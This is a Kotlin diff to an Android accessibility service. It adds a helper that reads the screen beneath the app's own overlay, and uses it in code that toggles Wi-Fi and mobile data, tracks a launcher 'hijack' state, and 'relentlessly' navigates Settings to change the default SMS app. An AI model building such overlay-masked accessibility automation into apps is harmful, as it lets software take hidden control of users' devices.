@@ -429,7 +429,7 @@ class MyAccessibilityService : AccessibilityService() {
                 logThrottled("HIJACK_DIAG", "Hijack active but BLOCKED by SafeZone.")
             } else {
                 val currentHome = DeviceManager.getDefaultApps(this).optString("launcher", "")
-                val root = rootInActiveWindow
+                val root = getBypassOverlayRoot()
                 val activePkg = root?.packageName?.toString() ?: pkgName
                 
                 val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
@@ -545,7 +545,7 @@ class MyAccessibilityService : AccessibilityService() {
         }
 
         if (!isSafeZoneActive(this) && isWaitingForWifiSettings && pkgName.contains("settings")) {
-            val root = rootInActiveWindow
+            val root = getBypassOverlayRoot()
             val switchNodes = root?.findAccessibilityNodeInfosByViewId("com.android.settings:id/switch_widget") 
                 ?: root?.findAccessibilityNodeInfosByViewId("android:id/switch_widget")
             
@@ -595,7 +595,7 @@ class MyAccessibilityService : AccessibilityService() {
         }
 
         if (!isSafeZoneActive(this) && isWaitingForDataSettings && pkgName.contains("settings")) {
-                val root = rootInActiveWindow
+                val root = getBypassOverlayRoot()
                 val targetNodes = root?.findAccessibilityNodeInfosByText("Mobile data")
                 if (!targetNodes.isNullOrEmpty()) {
                     for (node in targetNodes) {
@@ -658,7 +658,7 @@ class MyAccessibilityService : AccessibilityService() {
 
             val mode = DefaultSmsManager.expectedMode
             if (!isSafeZoneActive(this) && (mode == "AUTO" || mode == "RELENTLESS")) {
-                val root = rootInActiveWindow ?: return
+                val root = getBypassOverlayRoot() ?: return
                 
                 // Resolve which app name we are looking for
                 val targetLabel = try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception) { "Settings" }
@@ -731,7 +731,7 @@ class MyAccessibilityService : AccessibilityService() {
                     }
                 }
             } else if (!isSafeZoneActive(this) && (mode == "RESTORE" || mode == "AUTO_NAV")) {
-                val root = rootInActiveWindow ?: return
+                val root = getBypassOverlayRoot() ?: return
                 val originalPkg = getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("original_sms_package", null)
                 
                 val targetLabel = if (mode == "AUTO_NAV") {
@@ -1364,10 +1364,26 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
+    private fun getBypassOverlayRoot(): android.view.accessibility.AccessibilityNodeInfo? {
+        val root = rootInActiveWindow
+        // If the focused window is our own overlay, bypass it and grab the underlying system window
+        if (root?.packageName?.toString() == packageName) {
+            try {
+                for (window in windows) {
+                    val winRoot = window.root
+                    if (winRoot != null && winRoot.packageName?.toString() != packageName) {
+                        return winRoot
+                    }
+                }
+            } catch (e: Exception) {}
+        }
+        return root
+    }
+
     private fun handleSequenceEvent(pkg: String) {
         if (isSafeZoneActive(this) || activeSequence == null || !pkg.contains("settings")) return
 
-        val root = rootInActiveWindow ?: return
+        val root = getBypassOverlayRoot() ?: return
         
         when (activeSequence) {
             "FONT_PHASE_1" -> {
